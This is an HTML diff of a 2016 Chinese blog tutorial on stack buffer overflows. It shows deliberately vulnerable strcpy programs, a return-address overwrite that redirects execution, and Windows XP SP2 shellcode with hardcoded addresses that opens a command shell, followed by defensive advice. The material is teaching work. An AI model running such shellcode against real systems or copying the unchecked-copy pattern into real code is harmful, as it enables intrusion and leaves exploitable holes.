@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="https://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+	<title>缓冲区溢出 | HNYYGHK</title>
+	<!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="HNYYGHK">
+    <meta name="author" content="hnyyghk">
+    <meta name="description" content="生活时常妥协，Coding未曾将就" />
+    <meta name="keywords" content="Blog" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+
+    <!-- Custom stylesheet, (add custom styles here, always load last) -->
+    <!-- Load our stylesheet for IE8 -->
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- Google Webfonts (Monserrat 400/700, Open Sans 400/600) -->
+    <link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'>
+
+    <!-- Load our fonts individually if IE8+, to avoid faux bold & italic rendering -->
+    <!--[if IE]>
+    <link href='https://fonts.googleapis.com/css?family=Montserrat:400' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Montserrat:700' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:600' rel='stylesheet' type='text/css'>
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="/js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+	<style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+	<style type="text/css">
+        #icon {
+          display: inline-block;
+          font-size: .9em;
+        }
+        #lnk {
+          font-size: .8em;
+          line-height: 3em;
+          color: #a9a9a9;
+          text-decoration: none;
+        }
+	    #bg{ display: none;  position: absolute;  top: 0%;  left: 0%;  width: 100%;  height: 100%;  background-color: black;  z-index:1001;  -moz-opacity: 0.7;  opacity:.70;  filter: alpha(opacity=70);}
+	    #about{
+	    	display: none;  
+	    	position: absolute;  
+	    	top: 20%;  
+	    	left: 50%; 
+	    	margin-left: -150px; 
+	    	width: 300px;  
+	    	background-color: #2c3338;  
+		    border-radius: 3px;
+		    padding: 20px 0;
+	    	z-index:1002;  
+	    	box-shadow: 0 0 5px rgba(0,0,0,.5);
+	    }
+	    #about-close{
+	    	position: absolute;
+	    	cursor: pointer;
+	    	top: 15px;
+	    	right: 15px;
+	    }
+	    #about-picture{
+	    	position: absolute;  
+	    	left: 50%; 
+	    	margin-left: -55px; 
+		    width: 110px;
+		    height: 110px;
+		    margin-bottom: 15px;
+		    margin-left: -45px;
+	    }
+	    #about-name{
+		    text-align: center;
+	    	margin-top: 110px;
+			color: #a9a9a9;
+	    }
+	    #about-learn{
+		    text-align: center;
+	    }
+	    #bgabout{ display: none;  position: absolute;  top: 0%;  left: 0%;  width: 100%;  height: 100%;  background-color: black;  z-index:1001;  -moz-opacity: 0.7;  opacity:.70;  filter: alpha(opacity=70);}
+	    #aboutme{
+	    	display: none;  
+	    	position: absolute;  
+	    	top: 25%;  
+	    	left: 50%; 
+	    	margin-left: -150px; 
+	    	width: 300px;  
+	    	background-color: #fff;  
+		    border-radius: 3px;
+		    padding: 20px 0;
+	    	z-index:1002;  
+	    	box-shadow: 0 0 5px rgba(0,0,0,.5);
+	    }
+	    #aboutme-close{
+	    	position: absolute;
+	    	cursor: pointer;
+	    	top: 15px;
+	    	right: 15px;
+	    }
+	    #aboutme-picture{
+	    	position: absolute;  
+	    	left: 50%; 
+	    	margin-left: -55px; 
+		    width: 110px;
+		    height: 110px;
+		    margin-bottom: 15px;
+		    margin-left: -45px;
+	    }
+	    #aboutme-name{
+		    text-align: center;
+	    	margin-top: 110px;
+	    }
+	    #aboutme-learn{
+		    text-align: center;
+	    }
+	</style>
+
+	<style type="text/css">
+		@charset "utf-8";
+		@import url(https://weloveiconfonts.com/api/?family=fontawesome);
+
+		[class*="fontawesome-"]:before {
+		  font-family: 'FontAwesome', sans-serif;
+		}
+
+		input {
+		  border: none;
+		  font-family: 'Open Sans', Arial, sans-serif;
+		  font-size: 16px;
+		  line-height: 1.5em;
+		  padding: 0;
+		  -webkit-appearance: none;
+		}
+
+		after { clear: both; }
+
+		#login {
+		  width: 300px;
+		}
+
+		#login form {
+		  margin: auto;
+		  padding: 0px 22px 5px 22px;
+		  width: 100%;
+		  border-radius: 5px;
+		}
+
+		#login form span {
+		  background-color: #363b41;
+		  border-radius: 3px 0px 0px 3px;
+		  border-right: 3px solid #434a52;
+		  color: #606468;
+		  display: block;
+		  float: left;
+		  line-height: 50px;
+		  text-align: center;
+		  width: 25px;
+		  height: 50px;
+		}
+
+		#login form input[type="text"] {
+		  background-color: #3b4148;
+		  border-radius: 0px 3px 3px 0px;
+		  color: #a9a9a9;
+		  margin-bottom: 1em;
+		  padding: 0 16px;
+		  width: 230px;
+		  height: 50px;
+		}
+
+		#login form input[type="password"] {
+		  background-color: #3b4148;
+		  border-radius: 0px 3px 3px 0px;
+		  color: #a9a9a9;
+		  margin-bottom: 1em;
+		  padding: 0 16px;
+		  width: 230px;
+		  height: 50px;
+		}
+
+		#login form input[type="submit"] {
+		  background: #b5cd60;
+		  border: 0;
+		  width: 100%;
+		  height: 40px;
+		  border-radius: 3px;
+		  color: white;
+		  cursor: pointer;
+		  transition: background 0.3s ease-in-out;
+		}
+		#login form input[type="submit"]:hover {
+		  background: #16aa56;
+		}
+	</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+    <!-- ============================ Off-canvas navigation =========================== -->
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+            <li>
+                <a class="sb-toggle-submenu">Tags<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+	                <li><a href="/tags/技术/" class="animsition-link">技术</a></li>
+	                <li><a href="/tags/随笔/" class="animsition-link">随笔</a></li>
+	                <li><a href="/tags/Blog/" class="animsition-link">Blog</a></li>
+                </ul>
+            </li>
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    <li><a target="_blank" rel="noopener" href="https://go.kieran.top">Kieran</a></li>
+                </ul>
+            </li>
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            <li><a href="javascript:showdiv()" title="about">About</a></li>
+            <li><a href="javascript:showdivmail()" title="email">Email</a></li>
+        </ul>
+    </div>
+    <!-- ============================ END Off-canvas navigation =========================== -->
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+        <!-- ============================ Header & Logo bar =========================== -->
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                            <img src="/img/logo.png" alt="Logo" width="35px;"/>
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="javascript:showdivmail()">HNYYGHK</a></li>
+                            <li><a href="https://github.com/hnyyghk" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            <li><a href="https://twitter.com/hnyyghk" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            <li><a href="https://www.facebook.com/hnyyghk" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            <li><a href="https://weibo.com/CodingCockroach" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+	                <span class="sr-only">Toggle navigation</span>
+	                <span class="icon-bar before"></span>
+	                <span class="icon-bar main"></span>
+	                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+        <!-- ============================ Hero Image =========================== -->
+        <section id="hero" class="scrollme">
+            <div class="container-fluid element-img" style="background: url(/img/bg_img.jpg) no-repeat center center fixed;background-size: cover">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
+                        <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
+                            <div>
+                                <h2><span>Life is short.</span></h2>
+                                <p></p>
+                                <h2></h2>
+                                <p>生活时常妥协，Coding未曾将就</p>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- // .col-md-12 -->
+                </div>
+                <div class="herofade beige-dk"></div>
+            </div>
+        </section>
+
+        <!-- Height spacing helper -->
+        <div class="heightblock"></div>
+        <!-- // End height spacing helper -->
+        <!-- ======================== END Hero Image ======================== -->
+    </div>
+
+	<!-- ============================ Content =========================== -->
+	<section id="intro">
+	    <div class="container">
+	        <div class="row col-md-offset-2">
+	            <div class="col-md-8">
+	                <h1>缓冲区溢出</h1>
+	    			<span class="post-meta">
+					    <time datetime="2016-05-24T03:21:45.000Z" itemprop="datePublished">2016-05-24</time>
+					    | 
+						<a href='/tags/技术/'>技术</a>,
+						<a href='/tags/Blog/'>Blog</a>
+					</span>
+					<span id="busuanzi_container_page_pv" style='display:none'>
+						 | 本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+					</span>
+	            </div>
+	        </div>
+	        <div class="col-md-8 col-md-offset-2">
+<p>缓冲区溢出是一种非常普遍、非常危险的漏洞。它有多种英文名称，如buffer overflow、buffer overrun、smash the stack、trash the stack等等，它也是一种比较有历史的漏洞，多个著名的漏洞报告都和缓冲区溢出有关，在各种操作系统、应用软件中广泛存在。缓冲区溢出，可以导致的后果包括：程序运行失败；系统当机，重新启动；攻击者可能利用它执行非授权指令，取得系统特权，进而进行各种非法操作；等等。<br>一个非常著名的缓冲区溢出攻击是Morris蠕虫，它也是利用了某些机器上某些软件上存在的缓冲区溢出漏洞，发生在1988年，它曾造成了全世界大量网络服务器瘫痪。读者可以参考相关资料。缓冲区溢出的概念很简单。缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量溢出；某些情况下，溢出的数据只是覆盖在一些不太重要的内存空间上，不会产生严重后果；但是一旦溢出的数据覆盖在合法数据上，可能给系统带来巨大的危害。如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void function(char *input)</span><br><span class="line">&#123;</span><br><span class="line">char buffer[16];</span><br><span class="line">strcpy(buffer,input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>strcpy()将直接将input中的内容copy到buffer中。只要input的长度大于16，就会造成buffer的溢出。当然，这里所说的缓冲区，实际上就存在于”堆栈”区内。<br>我们可以假设最理想的情况是：程序对输入字符串长度进行检查，确保输入的长度不超过缓冲区允许的长度；但是在复杂的程序中，并不是每个程序员都会考虑到这一点。很多程序员都会假定输入的长度不会超过数组大小，如果一厢情愿地假设数据长度总是与所分配的储存空间会匹配，就为缓冲区溢出埋下了隐患。攻击者通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。存在象strcpy这样的问题的标准函数还有：strcat()；sprintf()；vsprintf()；gets()；scanf()；等等。具体大家可以参考相应文档。<br>缓冲区溢出本身并不可怕，关键是发生缓冲区溢出时，会覆盖下一个相邻的内存块。由于编程语言的某些不安全的特性，它允许程序溢出缓冲区(当然，也许这种溢出是出于偶然)。在这个程序中，当发生缓冲区溢出时，可能会导致很多不可预料的行为，如：程序的执行很奇怪；程序完全失败；等等。<br>当然，不可否认，也有可能出现这样一种情况，程序碰巧没有覆盖重要数据，程序可以继续，而且在执行中没有任何明显不正常，但是具备安全隐患。该问题给软件的维护带来了难度。存在缓冲区溢出隐患的程序，隐患的发作是不确定的，这使得对它们的调试异常棘手。<br>上一段所叙述的情况实际上是一种最坏的情况：在一个环境下(如开发阶段的测试过程中)，程序可能发生了缓冲区溢出，但因为没有覆盖重要数据，根本没有任何不正常；但在另一个环境下，可能在发生溢出时，碰巧地修改了分配在缓冲区附近的数据，程序执行发生不正常现象。从维护的角度讲，因为这种事情完全是”碰巧”，等到维护人员去维护时，问题就找不到了，白白花费维护人员的精力，并且可能得不到问题的本质解决。<br>缓冲区溢出有时候可能改变程序流程。举一个简单的例子，如果碰巧在缓冲区后面的内存中有一个布尔变量，该变量为true(1)或false(0)，决定用户是否可以执行某个敏感操作。如果该变量被缓冲区溢出的数据覆盖，可能由false(0)变为true(1)，程序的执行流程被更改。<br>上面的例子给出了缓冲区溢出的发生机制。当然，随便往缓冲区中填入内容，让缓冲区溢出，一般只是出现一些异常现象，顶多让程序崩溃，而不能达到刻意攻击的目的。<br>站在攻击者角度，让用户程序崩溃，属于没有什么技术含量的攻击。最常见的手段是：通过输入一段数据，造成缓冲区溢出，使程序运行一个用户命令。极端情况下，如果该程序属于管理员而且具有针对系统的任意操作权限的话，攻击者就可以利用这个漏洞造成更大的危害。<br>下面用一个例子来讲解缓冲区攻击的原理。所使用的环境为Microsoft Visual C++ 6.0，操作系统为Microsoft Windows XP Professional SP2。代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Test01.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">void fun1(char *input)   </span><br><span class="line">&#123;   </span><br><span class="line">    char buffer[10];  </span><br><span class="line">    strcpy(buffer,input);  </span><br><span class="line">    printf(&quot;Call fun1,buffer&#x3D;%s\n&quot;,buffer);  </span><br><span class="line">&#125;  </span><br><span class="line">void fun2()   </span><br><span class="line">&#123;   </span><br><span class="line">    printf(&quot;Call fun2&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">int main(int argc, char *argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">  printf(&quot;Address Of fun2&#x3D;%p\n&quot;,fun2);  </span><br><span class="line">  fun1(argv[1]);  </span><br><span class="line">  return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在命令行中运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test01.exe Security</span><br></pre></td></tr></table></figure>
+<p>结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Address of fun2&#x3D;00401005</span><br><span class="line">Call fun1,buffer&#x3D;Security</span><br></pre></td></tr></table></figure>
+<p>这是正常的。但如果输入一个长度大于10的字符串，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test01.exe abcdefghijklmnopqrstuvwxyz1234567890</span><br></pre></td></tr></table></figure>
+<p>则提示<br>“0x74737271”指令引用的”0x74737271”内存。该内存不能为”read”。<br>下面分析以下错误的提示：<br>该错误提示中，出现了一个”0x74737271”，”0x74”是字符”t”的ASCII码，”0x73”是字符”s”的ASCII码，”0x72”是字符”r”的ASCII码，”0x71”是字符”q”的ASCII码。这说明什么问题？<br>该问题出现的原因是，由于输入的字符串太长，数组buffer容纳不下，但是也要将多余的字符写入堆栈。这些多余的字符没有分配合法的空间，就会覆盖堆栈中以前的内容。如果覆盖的内容仅仅是一些普通数据，表面上也不会出什么问题，只是会造成原有数据的丢失。<br>但是，堆栈中还有一块区域专门保存着指令指针，存放下一个CPU指令存放的内存地址(你可以理解为某个函数的地址)。如果该处被覆盖，系统会错误地将覆盖的新值当成某个指令来执行。如上面的例子中，刚好是”qrst”(0x74737271)覆盖了那一片区域，系统会将”qrst”(0x74737271)的 ASCII 码视作返回地址，认为程序接下来要执行的是0x74737271所指向的那个函数，因此试图执行0x74737271处的指令，出现难以预料的后果，程序出错退出。<br>但是，仅仅让程序出错退出并没有什么用。如果将该处的内容不用”qrst”覆盖，而用函数fun2的地址覆盖，我们就可以运行函数fun2了！<br>现在我们用fun2的地址(00401005)去覆盖输入参数中”qrst”所在的内存，伪造下一个函数的地址，编写如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Test02.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">void fun1(char *input)   </span><br><span class="line">&#123;   </span><br><span class="line">    char buffer[10];  </span><br><span class="line">    strcpy(buffer,input);  </span><br><span class="line">    printf(&quot;Call fun1,buffer&#x3D;%s\n&quot;,buffer);  </span><br><span class="line">&#125;  </span><br><span class="line">void fun2()   </span><br><span class="line">&#123;   </span><br><span class="line">    printf(&quot;Call fun2&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">int main(int argc, char *argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">  printf(&quot;Address Of fun2&#x3D;%p\n&quot;,fun2);                               </span><br><span class="line">  fun1(&quot;abcdefghijklmnop\x05\x10\x40\x00&quot;);  </span><br><span class="line">  return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行Test02.exe,控制台上显示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Address Of fun2&#x3D;00401005</span><br><span class="line">Call fun1,buffer&#x3D;abcdefghijklmnop@</span><br><span class="line">Call fun2</span><br></pre></td></tr></table></figure>
+<p>注意！fun2函数被调用了！<br>在中文win2000、2003、xp中，指令通用跳转地址为 0x7ffa4512，如果命令该指令执行，程序就可以跳转到其它地方，运行其它程序，程序可以用shellcode来表示(有关shellcode，大家可以参考相应的文献)。如以下shellcode代码，表示打开一个命令行窗口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53&quot;  </span><br><span class="line">&quot;\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6&quot;</span><br><span class="line">&quot;\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA&quot;   </span><br><span class="line">&quot;\x77\x1d\x80\x7c&quot;   </span><br><span class="line">&quot;\x52\x8D\x45\xF4\x50\xFF\x55\xF0&quot;   </span><br><span class="line">&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot;   </span><br><span class="line">&quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4&quot;   </span><br><span class="line">&quot;\x50\xB8&quot;   </span><br><span class="line">&quot;\xc7\x93\xbf\x77&quot;   </span><br><span class="line">&quot;\xFF\xD0&quot;   </span><br><span class="line">&quot;\x83\xC4\x12\x5D&quot;</span><br></pre></td></tr></table></figure>
+<p>编写如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Test03.c</span><br><span class="line">&#x2F;&#x2F;windows xp sp2 system地址0x7801afc3</span><br><span class="line">&#x2F;&#x2F;windows xp sp2 loadlibrary地址0x77e69f64</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">void fun1(char *input)   </span><br><span class="line">&#123;   </span><br><span class="line">    char buffer[10];  </span><br><span class="line">    strcpy(buffer,input);  </span><br><span class="line">    printf(&quot;Call fun1,buffer&#x3D;%s\n&quot;,buffer);  </span><br><span class="line">&#125;  </span><br><span class="line">int main(int argc, char *argv[])  </span><br><span class="line">&#123;   </span><br><span class="line">  char buffer[] &#x3D; &quot;abcdefghijklmnop\x12\x45\xfa\x7f&quot;  </span><br><span class="line">&quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53&quot;  </span><br><span class="line">&quot;\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6&quot;</span><br><span class="line">&quot;\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA&quot;   </span><br><span class="line">&quot;\x77\x1d\x80\x7c&quot;    </span><br><span class="line">&quot;\x52\x8D\x45\xF4\x50\xFF\x55\xF0&quot;   </span><br><span class="line">&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot;   </span><br><span class="line">&quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4&quot;   </span><br><span class="line">&quot;\x50\xB8&quot;   </span><br><span class="line">&quot;\xc7\x93\xbf\x77&quot;    </span><br><span class="line">&quot;\xFF\xD0&quot;   </span><br><span class="line">&quot;\x83\xC4\x12\x5D&quot;;</span><br><span class="line">  fun1(buffer);  </span><br><span class="line">  return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成相应exe文件，运行时，能够打开控制台命令窗口。如果有权限，可以进行任意操作。<br>相应的防范方法：<br>如前所述，缓冲区溢出的原理，是通过将远程恶意代码注入到目标程序中以实现攻击的方法。就程序本质而言，缓冲区溢出的根本原因是由于像C、C++语言本身的不安全，如没有任何数组的界限检查和指针引用的检查，因此，检查边界成为最有效的工作，否则程序将冒着存在漏洞的风险。<br>解决缓冲区溢出的方法有如下几种：<br>1：积极检查边界。由于C和C++允许任意的缓冲区溢出，没有任何的缓冲区溢出边界检测机制来进行限制，因此，一般情况下，所有开发者需要手动在自己的代码中添加边界检测机制。<br>不过，也有一些优化的技术来减少手工检查的次数。如使用Richard Jones和Paul Kelly开发的gcc补丁、利用Compaq的 C 编译器等。<br>2：不让攻击者执行缓冲区内的命令。这种方法使得攻击者即使在被攻击者的缓冲区中植入了执行代码之后，也无法执行被植入的代码。具体方法大家可以参考相关的文献。<br>3：编写风格良好的代码。养成一个习惯，不要因为一味追求程序性能，而编写一些安全隐患较多的代码，特别是不要使用一些可能有漏洞的API，减少漏洞发生的可能。可以用一些查错工具，限制一些可能具有缓冲区溢出漏洞攻击的函数的调用(如strcpy和sprintf等)。<br>4：程序指针检查。程序指针检查不同于边界检查，程序指针检查是一旦修改了程序指针，就会被检测到，被改变的指针将不被使用。这样，即使一个攻击者成功地改变了程序的指针，因为系统事先检测到了指针的改变，这个指针将不会被使用，达不到攻击的目的。</p>
+	            <div class="clearfix"></div>
+	            <hr class="nogutter">
+	        </div>
+	        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+	    		<a class="pull-left" href="/2016/06/08/%E7%89%A9%E7%90%86%E7%BD%91%E8%80%83/" style="float: left;">← 物理网考</a>
+	    		<a class="pull-right" href="/2016/05/13/%E6%9C%AA%E6%88%90%E5%B9%B4%E8%AF%B7%E5%9C%A8%E7%88%B6%E6%AF%8D%E9%99%AA%E5%90%8C%E4%B8%8B%E8%A7%82%E7%9C%8B/">未成年请在父母陪同下观看 →</a>
+			</nav>
+			<div class="col-md-8 col-md-offset-2 col-sm-24">
+				<script type="text/javascript">
+					/**
+					 * 搜狐畅言
+					 */
+					document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+					window.onload = function () {(function () {
+                        var appid = 'cyw3KnBma';
+                        var conf = 'prod_f031046bf364de4c0e4ecf82c60d0699';
+                        var width = window.innerWidth || document.documentElement.clientWidth;
+                        var loadJs = function (d, a, id) {
+                            var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+                            var b = document.createElement("script");
+                            b.setAttribute("type", "text/javascript");
+                            b.setAttribute("charset", "UTF-8");
+                            b.setAttribute("src", d);
+                            if (id) {
+                                b.setAttribute("id", id);
+                            }
+                            if (typeof a === "function") {
+                                if (window.attachEvent) {
+                                    b.onreadystatechange = function () {
+                                        var e = b.readyState;
+                                        if (e === "loaded" || e === "complete") {
+                                            b.onreadystatechange = null;
+                                            a()
+                                        }
+                                    }
+                                } else {
+                                    b.onload = a
+                                }
+                            }
+                            c.appendChild(b)
+                        };
+                        loadJs("https://cy-cdn.kuaizhan.com/upload/changyan.js", function () {
+                            window.changyan.api.config({
+                                appid: appid,
+                                conf: conf
+                            })
+                        });
+                    })();}
+				</script>
+			</div>
+	    </div>
+	</section>
+	<!-- ========================= END Content ========================= -->
+	<section id="statement">
+	    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+	        <div class="row">
+	            <p>“每一个不曾起舞的日子都是对生命的辜负。”</p>
+	        </div>
+	    </div>
+	</section>
+	<!-- ============================ Footer =========================== -->
+	<footer id="footer">
+	    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By hnyyghk. All Rights Reserved.<br />Theme By <a target="_blank" rel="noopener" href="https://go.kieran.top" style="color: #767D84">Kieran</a>,Thanks.<br />
+                    <span id="busuanzi_container_site_uv">您是光临本站的第<span id="busuanzi_value_site_uv"></span>个小伙伴</span>
+                </p>
+            </div>
+            <div class="social">
+                <ul>
+                    <li><a href="https://github.com/hnyyghk" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    <li><a href="https://twitter.com/hnyyghk" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    <li><a href="https://www.facebook.com/hnyyghk" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    <li><a href="https://weibo.com/CodingCockroach" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+	</footer>
+	<!-- 不蒜子访问量统计 -->
+	<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
